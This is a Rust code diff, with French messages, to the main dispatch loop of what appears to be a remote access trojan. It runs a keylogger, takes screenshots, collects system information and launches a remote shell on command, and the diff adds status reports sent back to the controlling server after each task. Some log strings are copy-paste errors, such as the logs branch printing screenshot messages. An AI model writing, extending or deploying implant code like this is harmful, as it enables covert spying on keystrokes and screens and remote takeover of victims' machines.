@@ -3,8 +3,8 @@ mod input;
 mod logs;
 mod screenshot;
 mod shell;
-use tokio::task::JoinHandle;
 use rand::Rng;
+use tokio::task::JoinHandle;
 
 #[tokio::main]
 
@@ -20,9 +20,25 @@ async fn main() {
                         "keylogger" => {
                             let handle = tokio::spawn(async {
                                 println!("Démarrage du keylogger...");
-                                let keylogger = input::start_keylogger(10).await;
-                                if let Err(e) = keylogger {
-                                    eprintln!("La tâche keylogger a échoué : {:?}", e);
+                                match input::start_keylogger(10).await {
+                                    Ok(_) => {
+                                        println!("Keylogger terminé");
+                                        let _ = connexion::send_directive_status(
+                                            "keylogger",
+                                            "success",
+                                            "Terminé",
+                                        )
+                                        .await;
+                                    }
+                                    Err(e) => {
+                                        eprintln!("Erreur keylogger: {:?}", e);
+                                        let _ = connexion::send_directive_status(
+                                            "keylogger",
+                                            "error",
+                                            &format!("{:?}", e),
+                                        )
+                                        .await;
+                                    }
                                 }
                                 println!("Keylogger terminé");
                             });
@@ -31,7 +47,26 @@ async fn main() {
                         "screenshot" => {
                             let handle = tokio::spawn(async {
                                 println!("Prise de screenshot...");
-                                screenshot::take_screenshot().await;
+                                match screenshot::take_screenshot().await {
+                                    Ok(_) => {
+                                        println!("Screenshot terminé");
+                                        let _ = connexion::send_directive_status(
+                                            "screenshot",
+                                            "success",
+                                            "Terminé",
+                                        )
+                                        .await;
+                                    }
+                                    Err(e) => {
+                                        eprintln!("Erreur Screenshot: {:?}", e);
+                                        let _ = connexion::send_directive_status(
+                                            "screenshot",
+                                            "error",
+                                            &format!("{:?}", e),
+                                        )
+                                        .await;
+                                    }
+                                }
                                 println!("Screenshot terminé");
                             });
                             handles.push(handle);
@@ -39,9 +74,23 @@ async fn main() {
                         "logs" => {
                             let handle = tokio::spawn(async {
                                 println!("Récupération des logs système...");
-                                let log = logs::get_sysinfo().await;
-                                if let Err(e) = log {
-                                    eprintln!("Erreur logs : {:?}", e)
+                                match logs::get_sysinfo().await {
+                                    Ok(_) => {
+                                        println!("Screenshot terminé");
+                                        let _ = connexion::send_directive_status(
+                                            "logs", "success", "Terminé",
+                                        )
+                                        .await;
+                                    }
+                                    Err(e) => {
+                                        eprintln!("Erreur Screenshot: {:?}", e);
+                                        let _ = connexion::send_directive_status(
+                                            "logs",
+                                            "error",
+                                            &format!("{:?}", e),
+                                        )
+                                        .await;
+                                    }
                                 }
                                 println!("Logs terminés");
                             });
@@ -49,8 +98,26 @@ async fn main() {
                         }
                         "shell" => {
                             let handle = tokio::spawn(async {
-                                if let Err(e) = shell::launch_shell().await {
-                                    eprintln!("Erreur shell : {}", e);
+                                println!("Démarrage du shell distant");
+                                match shell::launch_shell().await {
+                                    Ok(_) => {
+                                        println!("Shell terminé");
+                                        let _ = connexion::send_directive_status(
+                                            "shell",
+                                            "success",
+                                            "Session shell terminée",
+                                        )
+                                        .await;
+                                    }
+                                    Err(e) => {
+                                        eprintln!("Erreur shell : {}", e);
+                                        let _ = connexion::send_directive_status(
+                                            "shell",
+                                            "error",
+                                            &format!("Erreur shell : {:?}", e),
+                                        )
+                                        .await;
+                                    }
                                 }
                             });
                             handles.push(handle);
